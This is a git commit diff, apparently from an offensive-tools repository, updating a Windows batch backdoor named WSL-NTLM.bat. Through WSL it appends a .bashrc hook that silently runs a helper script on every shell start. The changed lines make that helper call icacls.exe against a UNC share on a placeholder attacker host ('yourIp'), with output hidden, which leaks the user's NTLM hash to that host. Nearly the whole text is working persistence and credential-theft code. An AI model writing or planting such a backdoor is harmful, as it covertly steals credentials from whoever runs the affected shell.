65410bda04905f8db34a8962f430203b00fcbfb4
Cervoise <antoine.cervoise@gmail.com>
2018-10-15 09:06:12 +0200

    Update WSL-NTLM.bat

--- backdoor/get-hash/WSL-NTLM.bat
+++ backdoor/get-hash/WSL-NTLM.bat
@@ -1,6 +1,6 @@
 bash
 echo "./.call-me.sh" >> .bashrc
-echo "icacls.exe \\yourIp\yourShare\" >> .call-me.sh
-echo "clear" >> .call-me.sh
+echo "icacls.exe \"\\\\\\\\yourIp\\\\yourShare\\\\\" > /dev/null 2>&1" >> .call-me.sh
+chmod u+x .call-me.sh
 exit
 exit
